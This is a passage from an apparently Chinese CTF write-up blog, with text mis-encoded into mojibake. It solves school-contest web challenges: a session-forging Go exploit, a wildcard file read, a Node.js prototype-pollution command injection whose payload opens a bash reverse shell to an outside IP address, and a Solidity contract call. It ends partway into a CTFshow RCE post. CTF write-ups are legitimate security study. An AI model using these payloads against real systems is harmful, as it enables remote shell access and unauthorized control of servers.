class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">result = 1</span><br><span class="line">while True:</span><br><span class="line">    burp0_url = &quot;http://qlnuctf.shenghuo2.top:49194/&quot;</span><br><span class="line">    burp0_cookies = &#123;&quot;session&quot;: &quot;eyJzY29yZSI6MCwic3RhcnRfdGltZSI6MTY5NjY1NjY0OS43ODcwNTZ9.ZSDtCQ.0RE2Dez4_dd5v-o6Hk_rVi_UnpE&quot;&#125;</span><br><span class="line">    burp0_headers = &#123;&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">                     &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.55&quot;,</span><br><span class="line">                     &quot;Origin&quot;: &quot;http://qlnuctf.shenghuo2.top:49194&quot;,</span><br><span class="line">                     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">                     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,</span><br><span class="line">                     &quot;Referer&quot;: &quot;http://qlnuctf.shenghuo2.top:49194/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">                     &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;</span><br><span class="line">    burp0_data = &#123;&quot;answer&quot;: result&#125;</span><br><span class="line">    res_2 = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line"></span><br><span class="line">    timu_2 = re.search(r&#x27;&lt;h3&gt;(.*?)&lt;/h3&gt;&#x27;, res_2.text)</span><br><span class="line">    if &#x27;å¼‚æˆ–&#x27; in timu_2.group(1):</span><br><span class="line">        pattern = r&#x27;é¢˜ç›®ï¼š(\d+) å¼‚æˆ– (\d+) = ? &#x27;</span><br><span class="line">        match = re.search(pattern, res_2.text)</span><br><span class="line">        result = int(match.group(1)) ^ int(match.group(2))</span><br><span class="line">    elif &#x27;ä¸&#x27; in timu_2.group(1):</span><br><span class="line">            pattern = r&#x27;é¢˜ç›®ï¼š(\d+) ä¸ (\d+) = ? &#x27;</span><br><span class="line">            match = re.search(pattern, res_2.text)</span><br><span class="line">            result = int(match.group(1)) &amp; int(match.group(2))</span><br><span class="line">    else:</span><br><span class="line">            pattern = r&#x27;é¢˜ç›®ï¼š(\d+) (.) (\d+) = ? &#x27;</span><br><span class="line">            match = re.search(pattern, res_2.text)</span><br><span class="line">            group_1 = int(match.group(1))</span><br><span class="line">            group_3 = int(match.group(3))</span><br><span class="line">    if match.group(2) == &#x27;+&#x27;:</span><br><span class="line">        result = group_1 + group_3</span><br><span class="line">    elif match.group(2) == &#x27;-&#x27;:</span><br><span class="line">        result = group_1 - group_3</span><br><span class="line">    elif match.group(2) == &#x27;x&#x27;:</span><br><span class="line">        result = group_1 * group_3</span><br><span class="line">    elif match.group(2) == &#x27;Ã·&#x27;:</span><br><span class="line">        result = group_1 // group_3</span><br><span class="line">    if &quot;flag&quot; in res_2.text:</span><br><span class="line">        print(res_2.text)</span><br><span class="line">    time.sleep(1)</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231007144755630-1700994510649-50.png"></p><p>å°tipsï¼šæœ‰ä¸€ç‚¹éš¾çš„æ˜¯å°±æ˜¯ï¼Œå‘çš„åŒ…éœ€è¦æ˜¯å®Œæ•´çš„ï¼ŒåŠ ä¸Šsessionï¼ˆæœ€ä¸»è¦çš„ï¼‰ï¼Œä¹‹å‰æ²¡æœ‰å®Œæ•´çš„æ•°æ®åŒ…ï¼Œæäº†åŠå¤©ä¸è¡Œã€‚ã€‚ã€‚</p><h3 id="EasyGo"><a href="#EasyGo" class="headerlink" title="EasyGo"></a>EasyGo</h3><p>ä¸‹è½½é™„ä»¶ï¼Œæ˜¯ç”¨goçš„<a href="http://so.csdn.net/so/search?q=gin%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">ginæ¡†æ¶</a>å†™çš„åç«¯ï¼Œcookie-sessionæ˜¯ç”±<a href="http://github.com/gorilla/sessions">gorilla&#x2F;sessions</a>æ¥å®ç°ï¼Œè€Œsessionsåº“ä½¿ç”¨äº†å¦ä¸€ä¸ªåº“ï¼š<a href="http://github.com/gorilla/securecookie">gorilla&#x2F;securecookie</a>æ¥å®ç°å¯¹cookieçš„å®‰å…¨ä¼ è¾“ã€‚</p><p>æŸ¥çœ‹æºç ï¼Œå‘ç°ä¸»è¦éƒ¨åˆ†åœ¨route.goéƒ¨åˆ†ï¼Œéœ€è¦adminæ‰æœ‰æƒé™æŸ¥çœ‹æ–‡ä»¶å¾—åˆ°flag</p><p>æ€»å…±æœ‰ä¸¤ä¸ªè·¯ç”±ï¼Œä¸€ä¸ªâ€œ&#x2F;â€œè·¯ç”±ï¼Œä¸€ä¸ªâ€&#x2F;readflagâ€è·¯ç”±</p><p>æ ¹è·¯ç”± &#x2F;</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;main/route&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">r.GET(<span class="string">&quot;/readflag&quot;</span>, route.Readflag)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:8000&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ä¸»è¦çš„ä¸€éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;)))</span><br><span class="line"></span><br><span class="line">func Index(c *gin.Context) &#123;</span><br><span class="line">session, err := store.Get(c.Request, &quot;session-name&quot;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">if session.Values[&quot;name&quot;] == nil &#123;</span><br><span class="line">session.Values[&quot;name&quot;] = &quot;User&quot;</span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(200, &quot;Hello, User. How to become admin?&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œå°†åˆ¤æ–­æ˜¯å¦æºå¸¦äº†cookieï¼Œå¦‚æœcookieä¸­çš„nameä¸ºç©ºï¼Œå°±å°†å…¶è®¾ç½®ä¸ºuserã€‚å¹¶ä¸”æœ‰ä¸€ä¸ªç»†èŠ‚ï¼Œæ— è®ºæ˜¯å¦æ˜¯ç®¡ç†å‘˜ï¼Œæ ¹è·¯ç”±æ°¸è¿œéƒ½ä¼šè¿”å›Hello, User. How to become admin?</p><p>æƒ³åˆ°éœ€è¦ä¼ªé€ session</p><p>ä¸Šé¢é€šè¿‡è·å–ç¯å¢ƒå˜é‡ä¸­çš„SESSION_KEYæ¥è·å–ç”Ÿæˆsecurecookieã€‚åªèƒ½å¯¹SESSION_KEYè¿›è¡ŒçŒœæµ‹ï¼ŒçŒœæµ‹å¹¶æœªè®¾ç½®SESSION_KEYã€‚åœ¨æœ¬åœ°è¿è¡Œç¨‹åºï¼Œå°†SESSION_KEYç½®ä¸ºç©ºä»è€Œä¼ªé€ cookieã€‚</p><p>è¿™é‡Œå°†route.goä¿®æ”¹ä¸€ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, User. How to become admin?&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨é™„ä»¶ç›®å½•</p><p>å‘½ä»¤è¡Œgo run main.go</p><p>ä¹‹åè®¿é—®127.0.0.1:8000è·å–session</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008185921131-1700994510649-48.png"></p><p>å¾—åˆ°session</p><blockquote><p>MTY5NjY1NDM2M3xEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXx83HZpaT0T7b2lYtEd0cAmvQ_sS926v-ycwnspOHOOGw&#x3D;&#x3D;</p></blockquote><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008190015859-1700994510649-51.png"></p><p>è¿™é‡Œå‘¼åº”å‰é¢ä¿®æ”¹ä¹‹åä»–ä¸è·³è½¬ï¼Œä¸€ç›´æ˜¾ç¤ºHello, User. How to become admin?ï¼Œä¿®æ”¹ä¹‹åéœ€è¦è®¿é—®url&#x2F;readflagæ‰èƒ½çœ‹åˆ°å›æ˜¾</p><p>è®¿é—®url&#x2F;readflagå¯ä»¥çœ‹åˆ°å‡ºç°äº†ä½ å·²ç»æ˜¯adminï¼Œæ€ä¹ˆè·å¾—flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Congratulation! You are admin,But how to get flag?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">path := c.Query(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line"></span><br><span class="line">reg := regexp.MustCompile(<span class="string">`[b-zA-Z_@#%^&amp;*:&#123;|&#125;+&lt;&gt;&quot;;\[\]]`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reg.MatchString(path) &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;nonono&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»æºç çœ‹åˆ°éœ€è¦filenameè¯»æ–‡ä»¶ï¼Œè¿‡æ»¤äº†å¥½å¤šå­—ç¬¦ï¼Œæ²¡è¿‡æ»¤ï¼Ÿé€šé…ç¬¦è¯»flagå°±å¥½</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231007151052327-1700994510649-49.png"></p><h3 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h3><p>è¿™ä¸ªé¢˜åŸºæœ¬ä¸ŠåŸé¢˜äº†ã€‚ã€‚ã€‚ã€‚åŸé¢˜æ˜¯è´µé˜³å¤§æ•°æ®åŠç½‘ç»œå®‰å…¨ç²¾è‹±å¯¹æŠ—èµ›çš„JUST_PROTO</p><p><a href="http://cloud.tencent.com/developer/article/2282627">http://cloud.tencent.com/developer/article/2282627</a></p><p>ä¸‹è½½é™„ä»¶ç›´æ¥çœ‹æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const &#123; exec &#125; = require(&quot;child_process&quot;);</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; </span><br><span class="line">    res.send(&#x27;è°è¯´JavaScriptä¸ç®—Java&#x27;));</span><br><span class="line"></span><br><span class="line">let gift = &#123;</span><br><span class="line">    s1: (token)=&gt;&#123; </span><br><span class="line">        return !!token </span><br><span class="line">    &#125;,</span><br><span class="line">    sl: ()=&gt;&#123; </span><br><span class="line">        if (</span><br><span class="line">            JSON.stringify(si).length &gt; 8000) </span><br><span class="line">            si = &#123;&#125; </span><br><span class="line">        &#125;, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">let si = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/set&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    gift.sl(); </span><br><span class="line">    const &#123;token, key, val&#125; = req.query;</span><br><span class="line">    if (!gift.s1(token) || !val) return res.send(&quot;what?&quot;); </span><br><span class="line">    si[token][key] = val; </span><br><span class="line">    res.json(&#123; is_succ: true &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/get&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    const &#123;token, key&#125; = req.query;</span><br><span class="line">    if (!gift.s1(token)) return res.send(&quot;what?&quot;);</span><br><span class="line">    let result = si[token];</span><br><span class="line">    if (result) result = result[key];</span><br><span class="line">    res.json(&#123; result: result === undefined ? &quot;null&quot; : result, is_succ: result !== undefined &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.put(&#x27;/up&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    let date_stream = Buffer.from(JSON.stringify(si)); </span><br><span class="line">    const cmd = gift.redis_set + `date $&#123;date_stream.toString(&#x27;base64&#x27;)&#125;`;</span><br><span class="line">    exec(cmd, (err,_,__) =&gt; &#123;</span><br><span class="line">        if (err) return res.json(&#123; is_succ: false &#125;);</span><br><span class="line">        res.json(&#123; is_succ: true &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(8080, () =&gt; console.log(`è°è¯´JavaScriptä¸ç®—Java`));</span><br></pre></td></tr></table></figure><p>åŸå‹é“¾æ±¡æŸ“ï¼Œå…¶ä¸­çš„execå­˜åœ¨å‘½ä»¤æ‹¼æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">print(requests.get(</span><br><span class="line">    &quot;http://k2p.shenghuo2.top:40046/set?token=__proto__&amp;key=redis_set&amp;val=bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F123.57.236.154%2F9999%200%3E%261&#x27;;&quot;).text)</span><br><span class="line">requests.put(f&quot;http://k2p.shenghuo2.top:40046/up&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008191215353-1700994510650-53.png"></p><h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><p>å‡†å¤‡å·¥ä½œ ncå·¥å…·  MetaMask  <a href="http://remix.ethereum.org/">remixç½‘ç«™</a></p><p>æœ¬é¢˜å€Ÿé‰´æ–‡ç« <a href="http://coldwinds5167.github.io/2022/10/Blockchain-solve/">http://coldwinds5167.github.io/2022/10/Blockchain-solve/</a></p><p>å…ˆåˆ©ç”¨é¢˜ç›®ç»™äº†æ°´é¾™å¤´ï¼Œåˆ›å»ºä¸€ä¸ªè´¦æˆ·</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008194559328-1700994510650-52.png"></p><p>æ ¹æ®è¦æ±‚ï¼Œå‘å¤šäº0.01ä¸ªæµ‹è¯•å¸æ³¨å†Œè´¦å·</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008194648446-1700994510650-54.png"></p><p>ä¹‹åè®¿é—®2ï¼ˆéœ€è¦æ‰‹åŠ¨æ¨å‡ºncé‡æ–°é“¾æ¥ï¼‰</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008194728150-1700994510650-57.png" alt="image-20231008194728150"></p><p>æå–ä»–ç»™çš„contrant address</p><p> 0x002C8040CC431dCd9440B966E5A3f63B9ab61F56</p><p>åœ¨è¿™ä¹‹å‰ä½ éœ€è¦åˆ©ç”¨é¢˜ç›®ç»™çš„æ°´é¾™å¤´å’Œrcpåˆ›å»ºé’±åŒ…è´¦æˆ·</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008195942763-1700994510650-55.png"></p><p>é€‰ä¸­ç½‘ç»œ</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008200011224-1700994510650-56.png"></p><p>ä¹‹åç‚¹æ·»åŠ ç½‘ç»œ-æ‰‹åŠ¨æ·»åŠ ç½‘ç»œ</p><p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008200126241.png"></p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008200158766-1700994510650-59.png"></p><p>ä¹‹åå¤åˆ¶ä½ é’±åŒ…åœ°å€<img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008200232881-1700994510650-58.png"></p><p>æ”¾åˆ°ç»™çš„æ°´é¾™å¤´åœ°å€</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008200323977-1700994510650-61.png"></p><p>ä¹‹åä½ çš„è´¦æˆ·é‡Œå°±æœ‰é’±äº†</p><p>ä¹‹åè®¿é—®4ï¼Œå¾—åˆ°åˆçº¦</p><p>pragma solidity 0.8.9;</p><p>contract Greeter {<br>    string greeting;</p><pre><code>constructor(string memory _greeting) &#123;    greeting = _greeting;&#125;function greet() public view returns (string memory) &#123;    return greeting;&#125;function setGreeting(string memory _greeting) public &#123;    greeting = _greeting;&#125;function isSolved() public view returns (bool) &#123;    string memory ctf = &quot;YouAreTheFutur3ofQLNU&quot;;    return keccak256(abi.encodePacked(ctf)) == keccak256(abi.encodePacked(greeting));&#125;&#125;</code></pre><p>æˆ‘ä»¬è¿™é‡Œç”¨åˆ°remix</p><p>exp</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.9</span>;</span><br><span class="line"></span><br><span class="line">contract Greeter &#123;</span><br><span class="line">    <span class="type">string</span> greeting;</span><br><span class="line"></span><br><span class="line">    constructor(<span class="type">string</span> memory _greeting) &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (<span class="type">string</span> memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(<span class="type">string</span> memory _greeting) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (<span class="type">bool</span>) &#123;</span><br><span class="line">        <span class="type">string</span> memory ctf = <span class="string">&quot;YouAreTheFutur3ofQLNU&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(ctf)) == keccak256(abi.encodePacked(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">    address transcation=<span class="number">0xbaed0e840640c1d979ACed1315e14D983808F9F5</span>;<span class="comment">//è¿™é‡Œçš„0xå•¥å¯¹åº”çš„æ˜¯æˆ‘ä»¬å‰é¢æå–çš„é’±åŒ…åœ°å€</span></span><br><span class="line">    Greeter target=Greeter(transcation);</span><br><span class="line">    constructor()payable&#123;&#125;</span><br><span class="line">    function hack() public returns(<span class="type">bool</span>)&#123;</span><br><span class="line">        <span class="type">bool</span> ans=<span class="literal">false</span>;</span><br><span class="line">        <span class="type">string</span> memory greeting=<span class="string">&quot;YouAreTheFutur3ofQLNU&quot;</span>;</span><br><span class="line">        target.setGreeting(greeting);</span><br><span class="line">        ans=target.isSolved();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008195429292-1700994510650-62.png"></p><p>çº¢è‰²çš„åœ°æ–¹è¦å¯¹åº”èµ·æ¥</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008195603850-1700994510650-60.png"></p><p>å…ˆå¯¹åº”ç¬¬ä¸€æ­¥ï¼Œå…ˆinjectçš„é‚£ä¸ªï¼Œç¬¬äºŒæ­¥deployï¼Œä¹‹åå°ç‹ç‹¸é’±åŒ…ï¼ˆMetaMaskï¼‰ä¼šå¼¹çª—è®©ä½ ç¡®è®¤ï¼Œç­‰åˆ°ä¸‹é¢å‡ºç°ç»¿è‰²å¯¹å·å°±å¯ï¼Œç¬¬ä¸‰æ­¥hackï¼Œå°ç‹ç‹¸é’±åŒ…å‘é’±ï¼ŒæˆåŠŸåï¼Œå›å»è®¿é—®4å°±å¯ä»¥äº†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-RCEæé™å¤§æŒ‘æˆ˜</title>
      <link href="/2023/10/01/%E5%AE%8F/"/>
      <url>/2023/10/01/%E5%AE%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFshow-RCEæé™å¤§æŒ‘æˆ˜"><a href="#CTFshow-RCEæé™å¤§æŒ‘æˆ˜" class="headerlink" title="CTFshow-RCEæé™å¤§æŒ‘æˆ˜"></a>CTFshow-RCEæé™å¤§æŒ‘æˆ˜</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><a href="https://so.csdn.net/so/search?q=ctfshow&spm=1001.2101.3001.7020">ctfshow</a>å‡ºçš„è¿™äº”é“rceæ„Ÿè§‰æŒºå¥½ç©çš„ï¼Œä½†è‡ªå·±æ²¡åšå‡ºå‡ é“æ¥ï¼Œæ‰€ä»¥æ¥è¯¦ç»†çš„å¤ç°ä¸€ä¸‹ï¼Œè¿™å‡ é“é¢˜åŸºæœ¬éƒ½æ˜¯åˆ©ç”¨çš„è‡ªå¢ï¼Œä½†é•¿åº¦é€æ¸ç¼©çŸ­ï¼Œé›€æ°æé™ã€‚</p><h2 id="RCE1"><a href="#RCE1" class="headerlink" title="RCE1"></a>RCE1</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ 